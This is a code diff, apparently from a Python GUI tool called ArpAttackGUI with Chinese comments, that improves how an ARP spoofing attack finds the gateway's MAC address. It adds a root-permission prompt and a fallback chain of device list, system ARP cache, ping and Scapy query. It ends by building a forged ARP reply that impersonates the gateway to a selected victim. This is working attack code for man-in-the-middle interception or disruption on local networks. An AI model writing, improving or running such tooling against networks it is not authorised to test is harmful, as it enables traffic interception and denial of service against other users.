@@ -612,12 +612,14 @@ class ArpAttackGUI:
 
     def start_attack(self):
         sel = self.tree.selection()
-        if not sel: return
-        
+        if not IS_WINDOWS and os.getuid() != 0:
+            if not messagebox.askyesno("权限提示", "检测到当前未以 root/sudo 权限运行。\n在 macOS/Linux 下，发送底层 ARP 数据包需要管理员权限。\n\n是否仍尝试继续？（若报错请在终端使用 sudo python3 gui_arp.py 启动）"):
+                return
+
         vals = self.tree.item(sel[0])["values"]
         ip, mac = str(vals[0]), str(vals[1])
-        gw = self.gateway_var.get()
-        iface = self.iface_var.get()
+        gw = self.gateway_var.get().strip()
+        iface = self.iface_var.get().strip()
         
         async def run_attack():
             try:
@@ -626,11 +628,39 @@ class ArpAttackGUI:
                 self.root.after(0, lambda: self.status_var.set("正在获取网关 MAC..."))
                 loop = asyncio.get_running_loop()
                 def get_gw_mac():
-                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=3, retry=2, verbose=False, iface=iface)
-                    return ans[0][1].hwsrc if ans else None
+                    # 1. 优先从已扫描出的设备列表中直接提取
+                    for item in self.tree.get_children():
+                        row = self.tree.item(item)["values"]
+                        if row and str(row[0]).strip() == gw:
+                            return normalize_mac(str(row[1]).strip())
+
+                    # 2. 从系统 ARP 缓存中直接获取
+                    sys_arp = get_system_arp_cache(iface)
+                    if gw in sys_arp:
+                        return sys_arp[gw]
+
+                    # 3. 发送一次轻量 ping 激活系统 ARP 缓存后再查
+                    try:
+                        ping_cmd = ["ping", "-n", "1", "-w", "1000", gw] if IS_WINDOWS else ["ping", "-c", "1", "-W", "1", gw]
+                        subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        sys_arp = get_system_arp_cache(iface)
+                        if gw in sys_arp:
+                            return sys_arp[gw]
+                    except Exception:
+                        pass
+
+                    # 4. 尝试 Scapy 发送 ARP 查询
+                    try:
+                        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=3, retry=2, verbose=False, iface=iface)
+                        if ans:
+                            return normalize_mac(ans[0][1].hwsrc)
+                    except Exception:
+                        pass
+
+                    return None
                 
                 gw_mac = await loop.run_in_executor(None, get_gw_mac)
-                if not gw_mac: raise Exception(f"无法发现网关 {gw} 的 MAC")
+                if not gw_mac: raise Exception(f"无法发现网关 {gw} 的 MAC，请检查网关 IP 与网卡配置是否正确")
                 
                 self_mac = get_if_hwaddr(iface)
                 p1 = Ether(dst=mac, src=self_mac)/ARP(op=2, psrc=gw, hwsrc=self_mac, pdst=ip, hwdst=mac)
